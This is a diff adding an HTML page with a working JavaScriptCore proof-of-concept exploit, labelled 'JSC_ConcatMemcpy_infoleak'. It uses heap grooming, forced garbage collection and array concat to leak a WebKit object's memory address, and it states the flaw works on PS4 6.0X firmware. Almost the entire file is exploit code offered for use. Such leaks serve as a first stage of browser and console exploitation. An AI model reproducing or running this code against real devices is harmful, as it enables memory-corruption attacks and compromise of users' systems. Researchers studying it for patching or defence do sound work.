@@ -1,0 +1,91 @@
+<script>
+function print(msg) {
+	alert(msg);
+}
+
+// Triggers full garbage collection
+function _gc() {
+	for (var i=0; i<0x100; i++) {
+		new Uint32Array(0x400*0x400);
+	}
+}
+
+function d2i(d) {
+
+	var ab = new ArrayBuffer(8);
+	var f64 = new Float64Array(ab);
+	var u32 = new Uint32Array(ab);
+
+	f64[0] = d;
+
+	return u32[0] + 0x100000000 * u32[1];
+}
+
+function bd2i(d) {
+	var ab = new ArrayBuffer(8);
+	var f64 = new Float64Array(ab);
+	var u32 = new Uint32Array(ab);
+	
+	return u32[0] + 0x100000000 * u32[1] - 0x1000000000000;
+}
+
+function i2d(i) {
+	
+	var ab = new ArrayBuffer(8);
+	var f64 = new Float64Array(ab);
+	var u32 = new Uint32Array(ab);
+
+	u32[0] = i % 0x100000000;
+	u32[1] = i/0x100000000;
+
+	return f64[0];
+}
+
+function hex(x) {
+	if (x < 0)
+		return `-${hex(-x)}`
+	return `0x${x.toString(16)}`
+}
+
+const __len = 0x40;
+
+// an object to leak
+var x = {};
+
+_gc();
+
+const MAGIC=0xB00B5;
+
+for (var i=0; i<0x1000; i++) {
+	var b = new Array(__len).concat(new Array(__len));
+	b[0] = x;
+
+	b[1] = i2d(MAGIC);
+}
+
+_gc();
+
+var a;
+for (var i=0; i<0x100; i++) {
+
+	a = new Array(__len).concat(new Array(__len));
+
+	a = a.concat([1.1]);
+
+	// check the magic value
+	if (d2i(a[1]) == 0x1000000000000 + MAGIC) {
+		break;
+	}
+}
+
+if (a[0] != void 0)
+	print (x.toString() + " address: " + hex(d2i(a[0])));
+else
+	print ("failed to get webkit object memory address");
+
+if (a[0] != void 0)
+	document.write ("<br> ~ JSC_ConcatMemcpy_infoleak - PoC ~ ", "<br> Patched on IOS 12, Vulnerable to PS4 6.0X", "<br>", x.toString() + " address: " + hex(d2i(a[0])));
+else
+	document.write ("failed to get webkit object memory address.");
+
+</script>
